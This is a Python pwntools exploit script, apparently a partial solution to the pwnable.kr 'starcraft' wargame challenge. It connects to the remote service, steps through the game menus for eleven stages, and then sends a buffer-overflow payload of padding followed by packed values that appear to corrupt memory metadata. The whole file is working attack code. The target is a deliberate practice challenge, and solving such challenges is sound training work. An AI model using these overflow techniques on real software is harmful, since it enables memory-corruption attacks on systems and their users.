#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys
import random

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

#p = process("./starcraft")
p = remote("pwnable.kr", 9020)

p.recvuntil("Ultralisk\n")

#choose templar

p.sendline("6")
p.recvuntil("strom) \n")

#change to arcon
p.sendline("1")
p.recvuntil("default) \n")

#start attack!

count = 0
while 1:
    #round
    p.sendline("0")
    data = p.recvuntil("default) \n")
    if "Stage" in data:
        count += 1
    if count == 11:
        
        #finish!
        break

p.sendline("1")
p.recvuntil("work : \n")

p.sendline("a" * 0x110 + p64(0x87) + p64(0x31) + p64(0x140) + p64(0x140))

data = p.recv()
print data

